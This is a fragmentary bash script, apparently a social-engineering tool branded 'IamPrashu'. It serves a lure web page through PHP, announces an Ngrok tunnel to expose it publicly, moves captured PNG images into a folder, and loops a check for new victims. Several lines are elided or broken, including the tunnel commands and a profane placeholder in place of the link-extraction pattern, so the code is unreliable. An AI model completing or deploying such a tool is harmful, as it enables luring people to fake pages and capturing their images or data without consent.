...
clear
figlet IamPrashu
echo -e '            \e[92m::: IamPrashu - Prashant Joshi:::\e[0m'
echo -e '          \e[92m::: github.com/iamprashu Google: iamprashu :::\e[0m'
echo -e "\e[92m"
...
cd webs/$site && mv custom.html template.html && php -S 127.0.0.1:80 > /dev/null 2>&1 &
sleep 8
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Ngrok Server..."
127.0.0.1:80 > /dev/null 2>&1 &
sleep 10
else
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Host Server..."
cd webs/$site && cp $site.html template.html && php -S 127.0.0.1:80 > /dev/null 2>&1 &
sleep 8
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Ngrok Server..."
127.0.0.1:80 > /dev/null 2>&1 &
sleep 10
fi
link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "#Fuck uUUUUU")
...
sleep 6.0
mv -f webs/$site/*.png /root/Desktop/ss > /dev/null 2>&1
echo " "
...
echo
echo -e "\e[92m---------------------\e[34mCHECK It Now..............\e[92m----------------------\e[0m"
echo
checkfound
fi
done
...
echo -e '\e[92m   THANKS FOR READING SUBSCRIBE IamPrashu'
